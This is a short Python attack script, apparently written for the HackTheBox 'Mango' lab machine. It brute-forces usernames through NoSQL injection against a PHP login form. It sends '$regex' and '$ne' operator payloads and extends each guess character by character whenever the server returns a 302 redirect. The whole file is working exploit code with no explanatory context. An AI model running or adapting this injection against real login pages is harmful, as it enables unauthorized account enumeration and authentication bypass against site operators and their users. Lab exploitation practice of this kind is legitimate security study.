#!/usr/bin/python
import requests
import string

password = "nonexists"
target = "http://staging-order.mango.htb/index.php"

headers = {'Content-type': 'application/x-www-form-urlencoded',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}

changed = False
names = []
badreg = ['*','+','.','?','|','\\','^','&','$']

if not names:
    for c in string.printable:
        if c not in badreg:
            payload = 'username[$regex]=^' +  c + '.*&password[$ne]=' + password + '&login=login'
            r = requests.post(target, headers = headers, data = payload, verify = False, allow_redirects = False)
            if r.status_code == 302:
                print("Found one more char : %s" % c)
                names.append(c)
                changed = True

while changed:
    changed = False;
    for i in range(len(names)):
        for c in string.printable:
            if c not in badreg:
                payload = 'username[$regex]=^' + names[i] + c + '.*&password[$ne]=' + password + '&login=login'
                r = requests.post(target, headers = headers, data = payload, verify = False, allow_redirects = False)
                if r.status_code == 302:
                    print("Found one more char : %s" % (names[i]+c))
                    names[i] = names[i] + c
                    changed = True
                    break
